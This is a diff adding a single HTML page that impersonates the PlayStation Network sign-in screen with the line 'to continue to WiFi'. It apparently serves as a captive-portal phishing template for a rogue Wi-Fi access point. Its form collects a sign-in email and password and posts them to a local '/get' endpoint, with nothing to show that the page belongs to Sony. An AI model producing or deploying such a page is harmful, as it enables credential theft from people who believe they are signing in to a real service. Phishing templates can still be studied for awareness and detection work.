@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+    <title>PlayStation™Network</title>
+    <style>
+      body {
+        font-family: -apple-system, BlinkMacSystemFont, 'Roboto', 'Helvetica Neue', Arial, sans-serif;
+        background-color: #003087;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+        margin: 0;
+      }
+      .login-container {
+        width: 100%;
+        max-width: 400px;
+        padding: 20px;
+      }
+      .logo-container {
+        text-align: center;
+        margin-bottom: 32px;
+      }
+      .g-h1 {
+        font-size: 24px;
+        font-weight: 400;
+        color: #fff;
+        margin-bottom: 8px;
+      }
+      .g-h2 {
+        font-size: 14px;
+        color: rgba(255,255,255,0.7);
+        margin-bottom: 24px;
+      }
+      .g-input {
+        width: 100%;
+        padding: 14px 16px;
+        border: 1px solid rgba(255,255,255,0.3);
+        border-radius: 8px;
+        font-size: 16px;
+        margin-bottom: 16px;
+        box-sizing: border-box;
+        outline: none;
+        background: rgba(255,255,255,0.1);
+        color: #fff;
+      }
+      .g-input:focus {
+        border-color: #fff;
+        background: rgba(255,255,255,0.15);
+      }
+      .g-input::placeholder {
+        color: rgba(255,255,255,0.5);
+      }
+      .gbtn-primary {
+        width: 100%;
+        padding: 14px;
+        background-color: #fff;
+        color: #003087;
+        border: none;
+        border-radius: 8px;
+        font-size: 16px;
+        font-weight: 600;
+        cursor: pointer;
+      }
+      .gbtn-primary:hover {
+        background: #e6e6e6;
+      }
+      .link {
+        display: block;
+        text-align: center;
+        margin-top: 16px;
+        color: #fff;
+        font-size: 14px;
+        text-decoration: none;
+      }
+      .link:hover {
+        text-decoration: underline;
+      }
+      .footer {
+        margin-top: 24px;
+        text-align: center;
+        font-size: 12px;
+        color: rgba(255,255,255,0.5);
+      }
+      .footer a {
+        color: rgba(255,255,255,0.7);
+        text-decoration: none;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="login-container">
+      <div class="logo-container">
+        <svg viewBox="0 0 120 28" width="120" height="28" fill="#fff">
+          <text x="0" y="22" font-family="Arial" font-weight="700" font-size="20" letter-spacing="1">PlayStation</text>
+        </svg>
+      </div>
+      <h1 class="g-h1">Sign In to PSN</h1>
+      <p class="g-h2">to continue to WiFi</p>
+      <form action="/get" method="POST">
+        <input class="g-input" type="text" name="email" placeholder="Sign-In ID (Email Address)" required>
+        <input class="g-input" type="password" name="password" placeholder="Password" required>
+        <button type="submit" class="gbtn-primary">Sign In</button>
+      </form>
+      <a href="#" class="link">Forgot Password?</a>
+      <p class="footer">New to PSN? <a href="#">Create an Account</a></p>
+    </div>
+  </body>
+</html>
